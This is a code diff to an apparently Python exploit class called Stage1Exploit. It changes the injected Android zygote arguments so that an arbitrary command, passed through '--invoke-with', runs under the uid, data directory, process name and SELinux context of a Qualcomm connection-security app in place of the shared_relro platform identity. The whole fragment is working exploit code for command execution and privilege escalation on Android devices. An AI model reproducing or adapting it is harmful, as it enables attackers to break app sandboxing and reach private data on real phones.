@@ -189,12 +189,14 @@ class Stage1Exploit:
         assert "," not in command
         # TODO let you specify the SELinux context through command line arguments
         raw_zygote_arguments = [
-            "--setuid=1037",
-            "--setgid=1037",
+            "--setuid=10078",
+            "--setgid=10078",
             "--setgroups=3003",
+            "--target-sdk-version=28",
+            "--nice-name=com.qualcomm.qti.qms.service.connectionsecurity",
+            "--app-data-dir=/data/user/0/com.qualcomm.qti.qms.service.connectionsecurity",
             "--runtime-args",
-            "--nice-name=shared_relro",
-            "--seinfo=platform:shared_relro:complete",
+            "--seinfo=sysmonapp:sysmonapp_app:complete",
             "--runtime-flags=32767",
             "--invoke-with",
             f"{command}#",
